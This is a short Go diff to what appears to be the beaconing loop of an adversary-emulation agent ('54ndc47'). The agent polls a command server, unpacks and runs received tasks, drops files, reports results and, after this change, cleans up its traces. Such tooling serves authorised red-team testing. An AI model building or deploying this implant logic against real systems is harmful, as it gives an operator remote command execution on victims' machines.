@@ -11,24 +11,24 @@ import (
 	"./modules"
 )
 
+var beacon = 60
+
 func stayInTouch(server string, host string, paw string, group string, files string) {
-	fmt.Println("[54ndc47] beaconing")
+	fmt.Println("[+] Beaconing")
 	commands := modules.Beacon(server, paw, host, group, files)
-	if commands != nil {
-		if len(commands.([]interface{})) > 0 {
-			cmds := reflect.ValueOf(commands)
-			for i := 0; i < cmds.Len(); i++ {
-				cmd := cmds.Index(i).Elem().String()
-				fmt.Println("[54ndc47] running task")
-				command := modules.Unpack([]byte(cmd))
-				modules.Drop(server, files, command)
-				modules.Results(server, paw, command)
-			}
-		} else {
-			time.Sleep(60 * time.Second)
+	if commands != nil && len(commands.([]interface{})) > 0 {
+		cmds := reflect.ValueOf(commands)
+		for i := 0; i < cmds.Len(); i++ {
+			cmd := cmds.Index(i).Elem().String()
+			fmt.Println("[+] Running instruction")
+			command := modules.Unpack([]byte(cmd))
+			modules.Drop(server, files, command)
+			modules.Results(server, paw, command)
+			modules.ApplyCleanup(command)
 		}
 	} else {
-		fmt.Println("Something went terribly wrong.")
+		modules.Cleanup(files)
+		time.Sleep(time.Duration(beacon) * time.Second)
 	}
 }
 
